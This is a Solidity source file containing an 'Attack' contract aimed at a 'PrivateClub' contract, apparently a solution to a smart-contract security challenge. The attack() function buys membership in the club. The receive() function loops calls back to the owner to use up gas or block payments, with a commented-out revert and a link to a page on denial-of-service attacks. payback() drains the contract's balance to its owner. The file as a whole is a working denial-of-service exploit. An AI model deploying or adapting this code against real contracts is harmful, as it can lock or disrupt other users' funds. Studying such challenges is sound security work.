// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PrivateClub.sol";

contract Attack {
    PrivateClub private club;
    address public owner;
    event Received(address, uint);

    constructor(address payable _addr) {
        club = PrivateClub(_addr);
        owner = msg.sender;
    }

    function attack(
        address[] calldata _members,
        uint256 _amount
    ) external payable {
        require(msg.value == _amount, "Send more ETH");
        club.becomeMember{value: _amount}(_members);
    }

    // consume gassssss
    receive() external payable {
        // https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/
        emit Received(msg.sender, msg.value);
        for (uint8 i = 0; i < 5; i++) {
            payable(owner).call{value: msg.value, gas: 20000}("");
        }
        // revert();
    }

    function payback() external payable {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
